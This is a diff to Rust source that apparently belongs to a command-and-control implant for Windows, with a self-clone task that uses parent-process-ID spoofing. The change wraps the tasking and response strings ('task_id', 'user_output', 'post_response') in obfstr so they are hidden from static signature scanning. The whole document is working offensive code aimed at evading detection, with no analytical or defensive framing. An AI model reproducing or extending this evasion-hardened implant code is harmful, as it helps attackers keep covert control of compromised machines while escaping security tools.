@@ -15,6 +15,7 @@ use winapi::um::processthreadsapi::{
 };
 use winapi::um::winbase::{CREATE_NEW_CONSOLE, EXTENDED_STARTUPINFO_PRESENT};
 use winapi::um::winnt::PROCESS_ALL_ACCESS;
+use obfstr::obfstr;
 
 const MAX_PATH_LEN: usize = 260;
 const SystemProcessInformation: u32 = 5;
@@ -285,7 +286,7 @@ fn clone_with_ppid_spoof(parent_handle: HANDLE) -> Result<u32, String> {
 
 pub fn selfclone(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
     let id = task.get("id").unwrap().as_str().unwrap();
-    let timestamp = task.get("timestamp").unwrap().as_f64().unwrap();
+    let timestamp = task.get(obfstr!("timestamp")).unwrap().as_f64().unwrap();
 
     // Parse optional parent process name from parameters
     let params_str = task.get("parameters").and_then(|p| p.as_str()).unwrap_or("{}");
@@ -328,14 +329,14 @@ pub fn selfclone(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Err
     };
 
     let response_json = serde_json::json!({
-        "action": "post_response",
-        "responses": [
+        obfstr!("action"): obfstr!("post_response"),
+        obfstr!("responses"): [
             {
-                "task_id": id,
-                "user_output": output,
-                "timestamp": timestamp,
-                "status": status,
-                "completed": true,
+                obfstr!("task_id"): id,
+                obfstr!("user_output"): output,
+                obfstr!("timestamp"): timestamp,
+                obfstr!("status"): status,
+                obfstr!("completed"): true,
             }
         ]
     });
